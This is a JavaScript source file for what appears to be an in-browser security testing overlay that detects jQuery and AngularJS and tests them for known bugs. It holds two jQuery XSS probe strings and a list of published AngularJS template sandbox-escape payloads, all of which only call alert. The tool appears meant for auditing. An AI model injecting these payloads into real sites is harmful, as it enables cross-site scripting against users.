var ne = document.createElement('div');
ne.style = 'position:absolute; border:0px margin: 0px;  solid #f00; background:rgba(0,0,0,0.9); color:#fff; width: 100%; height: 100%; z-index:999999; left:0px; top:0px; margin:0px;font-family:verdana;font-size:10pt; overflow: scroll;';
ne.id = 'domi_win';
document.body.appendChild(ne);


domi_hdr();
domi_jquery_main();
domi_angular_main();
domi_ext_scripts();
domi_functs();

/*
 jQuery
 */

function domi_jquery_main() {
	var jqv = '';
	try {
		jqv = $.fn.jquery;
	}
	catch (err) {
	}
	finally {
		if (jqv != '') {
			domi_log('jQuery found, version: ' + jqv);
			domi_jquery_test();
		}
		else
			domi_log('jQuery not found...');
	}
}

function domi_jquery_bug(vuln) {
	domi_bug('Vulnerable to jQuery bug-' + vuln);
}

function domi_jquery_test() {
	domi_log('Testing for jQuery vulnerabilities...');
	$("<img src=x9521 onerror=domi_jquery_bug(9521)>");
	$("element[attribute='<img src=x11290 onerror=domi_jquery_bug(11290)>']");
}













function domi_log(msg) {
	ne.innerHTML += msg + '<br />';
}


function domi_bug(msg) {
	ne.innerHTML += '<span style="color:red;font-weight:bold;">' + msg + '</span><br />';
}

function domi_tbl(rows) {
	ne.innerHTML += '<table border=1 cellpadding=1 cellspacing=1 style="border-spacing: 10px; width: 50%">' + rows + '</table>';
}


function domi_tbl_row(r) {
	var row = ((i+1)%2==0)
		? '<tr style="background:#002; padding: 10px;">'
		: '<tr style="background:#000; padding: 10px;">';
//	row = row.concat('<td>' + i + '</td>');
	for (i in r) {
		row = row.concat('<td>' + r[i] + '</td>');
	}
	row = row.concat('</tr>');
	return row;
}



function domi_hdr() {
	ne.innerHTML +=
		'<div id="domihdr" style="display:block;">' +
			'<div id="domihdr_x" style="position:absolute; top:0px; right:0px; margin: 0px; display:block; float:right; clear:right; height:20px; width:100px; border:0px; text-align:center; font-family: verdana; font-size:10pt; background:red; color:yellow; font-weight:bold; cursor:pointer;" onclick="document.getElementById(\'domi_win\').remove()">close</div>' +
			'<pre style="font-family: verdana; font-size:12pt;">' +
		'</div>';
}

function domi_click(onclk, text) {
	return '<span style="cursor:pointer" onclick="'+onclk+'">'+text+'</span>';

}

function domi_load_script(url) {
	var r = document.createElement("script");
	r.src = url; // caching problem?
	document.body.appendChild(r);
}


function domi_functs() {
	domi_log('Listing custom functions');
	var fn = [];
	for (var f in window) {
		if (window.hasOwnProperty(f) && typeof window[f] === 'function') {
			fn.push(f);
		}
	}
	var tbl = '';
	var idx = 1;
	for (var f in fn) {
		var src = window[fn[f]].toSource();
		var str = Array();
		var fstr = Array('.hash','.location','window.','http:','https:','eval(');
		if (fn[f].substr(0,5) != 'domi_' && src.indexOf('\[native code\]') == -1) {
			for (var i in fstr) {
				if (src.indexOf(fstr[i]) != -1)
					str.push(fstr[i]);
			}
			tbl += domi_tbl_row([
				idx++,
				domi_click("window['"+fn[f]+"']()",'exec'),
				domi_click("alert(window['"+fn[f]+"'].toSource())", fn[f]),
				src.length,
				str.join(', '),
			]);
		}
	}
	domi_tbl(tbl);

}

function domi_ext_scripts() {
	domi_log("Searching for external scripts");
	var tbl = '';
	var idx = 1;
	for (s in document.scripts) {
		var src = document.scripts[s].src;
		if (src != undefined && src != '') {
			tbl += domi_tbl_row([
				idx++,
				src,
				domi_click("domi_load_script('"+src+"')", 'reload')
			])
		}
	}
	domi_tbl(tbl);
}

function domi_angular_test() {
	domi_log('Testing for AngularJS vulnerabilities...');
	var esc = [
		{
			ver:	"1.0.1 - 1.1.5",
			aut:	"Mario Heiderich (Cure53)",
			tpl:	"{{constructor.constructor('alert(1)')()}}"
		},{
			ver:	"1.2.0 - 1.2.1",
			aut:	"Jan Horn (Cure53)",
			tpl:	"{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}"
		},{
			ver:	"1.2.2 - 1.2.5",
			aut:	"Gareth Heyes (PortSwigger)",
			tpl:	"{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval(\"x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'\");}}"
		},{
			ver:	"1.2.6 - 1.2.18",
			aut:	"Jan Horn (Cure53)",
			tpl:	"{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}"
		},{
			ver:	"1.2.19 - 1.2.23",
			aut:	"Mathias Karlsson",
			tpl:	'{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}'
		},{
			ver:	"1.2.24 - 1.2.29",
			aut:	"Gareth Heyes (PortSwigger)",
			tpl:	"{{'a'.constructor.prototype.charAt=''.valueOf;$eval(\"x='\\\"+(y='if(!window\\\\u002ex)alert(window\\\\u002ex=1)')+eval(y)+\\\"'\");}}"
		},{
			ver:	"1.3.0",
			aut:	"Gábor Molnár (Google)",
			tpl:	"{{!ready && (ready = true) && (!call ? $$watchers[0].get(toString.constructor.prototype) : (a = apply) && (apply = constructor) && (valueOf = call) && (''+''.toString('F = Function.prototype;' + 'F.apply = F.a;' + 'delete F.a;' + 'delete F.valueOf;' + 'alert(1);')));}}"
		},{
			ver:	"1.3.1 - 1.3.2",
			aut:	"Gareth Heyes (PortSwigger)",
			tpl:	"{{ {}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join; 'a'.constructor.prototype.charAt=''.valueOf; $eval('x=alert(1)//'); }}"
		},{
			ver:	"1.3.3 - 1.3.18",
			aut:	"Gareth Heyes (PortSwigger)",
			tpl:	"{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join; 'a'.constructor.prototype.charAt=[].join; $eval('x=alert(1)//');  }}"
		},{
			ver:	"1.3.19",
			aut:	"Gareth Heyes (PortSwigger)",
			tpl:	"{{ 'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join; $eval('x=alert(1)//'); }}"
		},{
			ver:	"1.3.20",
			aut:	"Gareth Heyes (PortSwigger)",
			tpl:	"{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}"
		},{
			ver:	"1.4.0 - 1.4.9",
			aut:	"Gareth Heyes (PortSwigger)",
			tpl:	"{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}"
		}
	];
	for (var i in esc) {
		var r = document.createElement("div");
		r.innerHTML = esc[i]['tpl'];
		document.body.appendChild(r);
	}


}

function domi_angular_main() {
	var av = '';
	try {
		av = angular.version;
	}
	catch (err) {
	}
	finally {
		if (av != '') {
			domi_log('AngularJS found, version: ' + av['full']);
			domi_angular_test();
		}
		else
			domi_log('AngularJS not found...');
	}


}


